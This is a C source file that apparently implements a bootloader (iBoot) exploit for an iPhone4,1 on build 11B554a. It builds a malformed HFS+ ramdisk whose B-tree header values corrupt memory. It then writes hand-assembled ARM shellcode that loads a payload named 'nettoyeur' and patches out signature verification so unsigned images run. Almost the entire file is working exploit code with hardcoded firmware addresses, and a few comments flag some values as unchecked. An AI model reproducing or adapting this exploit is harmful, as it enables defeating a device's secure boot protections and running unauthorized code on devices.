// iPhone4,1 11B554a
// boot-ramdisk = "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/disk.dmg"

#define IMAGE_START 0x9FF00000
#define IMAGE_END 0x9FF52664
#define IMAGE_SIZE (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE ((IMAGE_START + 0xF7000) - IMAGE_END)
#define IMAGE_BSS_START 0x9FF43880
#define IMAGE_TEXT_END 0x9FF43000 /* XXX this is a lie */
#define IMAGE_STACK_SIZE 0x1000
#define IMAGE_LOADADDR 0x80000000
#define IMAGE_HUGECHUNK 0x3000000
#define IMAGE_JUMPADDR 0x84000000 //check please

#define breakpoint1_ADDR (0x18A88 + 1) /* ResolvePathToCatalogEntry */

#define fuck1_ADDR (0x198EA + 1)
#define fuck2_ADDR (0x19900 + 1)
#define fuck3_ADDR (0x19A16 + 1)

#define wait_for_event_ADDR (0x00814)
#define hugechunk_ADDR (0x00CAE + 1)
#define gpio_pin_state_ADDR (0x02C30 + 1)
#define gpio_set_state_ADDR (0x02C50 + 1)
#define get_timer_us_ADDR (0x01810 + 1)
#define reset_cpu_ADDR (0x01864 + 1)
#define readp_ADDR (0x196B0 + 1)
#define get_mem_size_ADDR (0x1F130 + 1)
#define putchar_ADDR (0x333A0 + 1)
#define adjust_stack_ADDR (0x1E86C + 1)
#define adjust_environ_ADDR (0x1ED68 + 1)
#define disable_interrupts_ADDR (0x340D8 + 1)
#define cache_stuff_ADDR (0x21CB8 + 1)
#define wtf_ADDR (0x01740 + 1)

#define iboot_warmup_ADDR (0x00110)
#define iboot_start_ADDR (0x00BD0 + 1)
#define main_task_ADDR (0x00C3C + 1)
#define panic_ADDR (0x201D8 + 1)
#define system_init_ADDR (0x202C4 + 1)
#define task_create_ADDR (0x208F4 + 1)
#define task_start_ADDR (0x20A54 + 1)
#define task_exit_ADDR (0x20A78 + 1)
#define printf_ADDR (0x32C08 + 1)
#define malloc_ADDR (0x196CC + 1)
#define free_ADDR (0x19780 + 1)
#define create_envvar_ADDR (0x17FF0 + 1)
#define bcopy_ADDR (0x3368C)
#define decompress_lzss_ADDR (0x24C90 + 1)

/** check all **/
#define get_current_task_ADDR (0x21064)
#define go_command_handler_ADDR (0x41238)
#define verify_shsh_ADDR (0x1A328)
#define nettoyeur_uncompressed_ADDR (0x47000)
#define nettoyeur_compressed_ADDR (0x46bfc)

#define NODE_SIZE (4096 * 2)
#define TOTAL_NODES (0xFFF)
#define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
#define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)

#define TREEDEPTH 1
#define TRYFIRST 0
#define TRYLAST 0

void patch_header(void **buffer)
{
    PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL); /* HFSPlusVolumeHeader::catalogFile.logicalSize */
    PUT_QWORD_BE(buffer, 0xc0, EXTENT_SIZE);           /* HFSPlusVolumeHeader::extentsFile.logicalSize */
}

void patch_catalog(void **buffer, void *nettoyeur, size_t nettoyeur_sz)
{
    memset(buffer, 'E', 14);
    memset((char *)buffer + 20, 'E', 256 - 20);
#if TREEDEPTH
    PUT_WORD_BE(buffer, 14, 3); /* BTHeaderRec::treeDepth */
#elif TRYLAST
    PUT_WORD_BE(buffer, 14, 2); /* BTHeaderRec::treeDepth */
#endif
    PUT_WORD_BE(buffer, 32, 512);       /* BTHeaderRec::nodeSize */
    PUT_DWORD_BE(buffer, 36, 0x7FFFFF); /* BTHeaderRec::totalNodes */
#if TRYFIRST
    PUT_DWORD_BE(buffer, 16, (0xFFFFFF / 512 - 1)); /* BTHeaderRec::rootNode (trigger) */
#else
                                //PUT_DWORD_BE(buffer, 16, 3);                      /* BTHeaderRec::rootNode */
#endif

    memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
}

void patch_extents(void **buffer, void *nettoyeur, size_t nettoyeur_sz)
{
    memset(buffer, 'F', 0x100);
    if (nettoyeur_sz > 216)
        memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
    PUT_WORD_BE(buffer, 32, NODE_SIZE);                                    /* BTHeaderRec::nodeSize */
    PUT_DWORD_BE(buffer, 36, TOTAL_NODES);                                 /* BTHeaderRec::totalNodes */
    PUT_DWORD_BE(buffer, 16, 0x500);                                       /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
    PUT_WORD_LE(buffer, 20, 0);                                            /* must be zero (see above) */
    PUT_WORD_LE(buffer, 14, 0);                                            /* must be zero, to allow r3 to grow */
    PUT_DWORD_LE(buffer, 46, IMAGE_START + 0x46D20);                       /* *r2 = r4 */
    PUT_DWORD_LE(buffer, 0x46D20 + 4 - 0x46CD4, (NODE_SIZE + 0x20) >> 5);  /* *(r0 + 4) = r9 */
    PUT_DWORD_LE(buffer, 0x46D20 + 0x20 - 0x46CD4, IMAGE_START + 0x46D49); /* r10 (code exec) */
    PUT_DWORD_LE(buffer, 0x46D20 + 0x24 - 0x46CD4, IMAGE_START + 0x46E44); /* r11 -> lr */

    /* shellcode */
    PUT_DWORD_LE(buffer, 0x46D48 + 0 - 0x46CD4, INSNW_LDR_SP_PC80);
    PUT_DWORD_LE(buffer, 0x46D48 + 4 - 0x46CD4, make_bl(0, 0x46D48 + 4, disable_interrupts_ADDR - 1));
    PUT_WORD_LE(buffer, 0x46D48 + 8 - 0x46CD4, INSNT_LDR_R_PC(4, 76));
    PUT_WORD_LE(buffer, 0x46D48 + 10 - 0x46CD4, INSNT_LDR_R_PC(0, 80));
    PUT_WORD_LE(buffer, 0x46D48 + 12 - 0x46CD4, INSNT_MOV_R_R(1, 4));
    PUT_WORD_LE(buffer, 0x46D48 + 14 - 0x46CD4, INSNT_LDR_R_PC(2, 80));
    PUT_DWORD_LE(buffer, 0x46D48 + 16 - 0x46CD4, make_bl(1, 0x46D48 + 16, bcopy_ADDR));
    PUT_DWORD_LE(buffer, 0x46D48 + 20 - 0x46CD4, INSNW_MOV_R1_2400);
    PUT_DWORD_LE(buffer, 0x46D48 + 24 - 0x46CD4, INSNW_STRH_R1_R4_E2C);
    PUT_WORD_LE(buffer, 0x46D48 + 28 - 0x46CD4, INSNT_LDR_R_PC(0, 68));
    PUT_DWORD_LE(buffer, 0x46D48 + 30 - 0x46CD4, INSNW_MOV_R1_80000000);
    PUT_WORD_LE(buffer, 0x46D48 + 34 - 0x46CD4, INSNT_B_PC4);
    PUT_WORD_LE(buffer, 0x46D48 + 42 - 0x46CD4, INSNT_STR_R1_R4_R0);
    PUT_WORD_LE(buffer, 0x46D48 + 44 - 0x46CD4, INSNT_LDR_R_PC(0, 56));
    PUT_WORD_LE(buffer, 0x46D48 + 46 - 0x46CD4, INSNT_LDR_R_PC(1, 60));
    PUT_WORD_LE(buffer, 0x46D48 + 48 - 0x46CD4, INSNT_STR_R1_R4_R0);
    PUT_DWORD_LE(buffer, 0x46D48 + 50 - 0x46CD4, make_bl(0, 0x46D48 + 50, 0x208E8));
    PUT_WORD_LE(buffer, 0x46D48 + 54 - 0x46CD4, INSNT_MOV_R_I(1, 0));
    PUT_WORD_LE(buffer, 0x46D48 + 56 - 0x46CD4, INSNT_STR_R1_R0_68);
    PUT_WORD_LE(buffer, 0x46D48 + 58 - 0x46CD4, INSNT_LDR_R_PC(0, 52));
    PUT_WORD_LE(buffer, 0x46D48 + 60 - 0x46CD4, INSNT_MOV_R_I(1, 0xFC));
    PUT_WORD_LE(buffer, 0x46D48 + 62 - 0x46CD4, INSNT_LDR_R_PC(2, 52));
    PUT_WORD_LE(buffer, 0x46D48 + 64 - 0x46CD4, INSNT_MOV_R_I(3, nettoyeur_sz));
    PUT_WORD_LE(buffer, 0x46D48 + 66 - 0x46CD4, INSNT_MOV_R_R(5, 0));
    PUT_DWORD_LE(buffer, 0x46D48 + 68 - 0x46CD4, make_bl(0, 0x46D48 + 68, decompress_lzss_ADDR - 1));
    PUT_WORD_LE(buffer, 0x46D48 + 72 - 0x46CD4, INSNT_LDR_R_PC(0, 44));
    PUT_WORD_LE(buffer, 0x46D48 + 74 - 0x46CD4, INSNT_BLX_R(0));
    PUT_DWORD_LE(buffer, 0x46D48 + 76 - 0x46CD4, make_bl(0, 0x46D48 + 76, cache_stuff_ADDR - 1));
    PUT_WORD_LE(buffer, 0x46D48 + 80 - 0x46CD4, INSNT_BLX_R(5));
    PUT_WORD_LE(buffer, 0x46D48 + 82 - 0x46CD4, INSNT_BX_R(4));
    PUT_DWORD_LE(buffer, 0x46D48 + 84 - 0x46CD4, IMAGE_START + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
    PUT_DWORD_LE(buffer, 0x46D48 + 88 - 0x46CD4, IMAGE_JUMPADDR);
    PUT_DWORD_LE(buffer, 0x46D48 + 92 - 0x46CD4, IMAGE_START);
    PUT_DWORD_LE(buffer, 0x46D48 + 96 - 0x46CD4, IMAGE_BSS_START - IMAGE_START);
    PUT_DWORD_LE(buffer, 0x46D48 + 100 - 0x46CD4, go_command_handler_ADDR /* go command handler */); /** fix everything from here **/
    PUT_DWORD_LE(buffer, 0x46D48 + 104 - 0x46CD4, verify_shsh_ADDR /* allow unsigned images */);
    PUT_DWORD_LE(buffer, 0x46D48 + 108 - 0x46CD4, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
    PUT_DWORD_LE(buffer, 0x46D48 + 112 - 0x46CD4, IMAGE_START + nettoyeur_uncompressed_ADDR /* nettoyeur uncompressed */);
    PUT_DWORD_LE(buffer, 0x46D48 + 116 - 0x46CD4, IMAGE_START + nettoyeur_compressed_ADDR /* nettoyeur compressed */);
    PUT_DWORD_LE(buffer, 0x46D48 + 120 - 0x46CD4, IMAGE_START + wtf_ADDR);
}
